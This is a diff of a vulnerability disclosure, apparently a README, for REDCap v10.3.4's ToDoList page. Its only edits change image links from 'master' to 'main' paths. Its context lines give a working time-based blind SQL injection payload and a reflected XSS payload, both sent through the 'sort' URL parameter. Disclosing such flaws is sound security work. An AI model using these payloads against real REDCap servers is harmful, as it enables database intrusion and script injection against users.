@@ -15,14 +15,14 @@ This vulnerability occurs when Completed & Archived Requests has more than 10 re
 
 1. SQLInjection : redcap_v10.3.4/ToDoList/index.php?sort=(select case when (1=2) then 1 else 1*((select*from(select(sleep(5)))a))end)
 <p align="center">
-<img src="https://github.com/vuongdq54/RedCap/blob/master/sql_todolist_sort_1.JPG" />
-<img src="https://github.com/vuongdq54/RedCap/blob/master/sql_todolist_sort_2.JPG" />
+<img src="https://github.com/vuongdq54/RedCap/blob/main/sql_todolist_sort_1.JPG" />
+<img src="https://github.com/vuongdq54/RedCap/blob/main/sql_todolist_sort_2.JPG" />
 </p>
 
 2. XSS : redcap_v10.3.4/ToDoList/index.php?sort=abc%27/%3E%3Cscript%3Ealert(%27xss%27)%3C/script%3E
 <p align="center">
-<img src="https://github.com/vuongdq54/RedCap/blob/pre_XSS_Todolist.JPG" />
-<img src="https://github.com/vuongdq54/RedCap/blob/master/XSS_Todolist.JPG" />
+<img src="https://github.com/vuongdq54/RedCap/blob/main/pre_XSS_Todolist.JPG" />
+<img src="https://github.com/vuongdq54/RedCap/blob/main/XSS_Todolist.JPG" />
 </p>
 
 ## reference
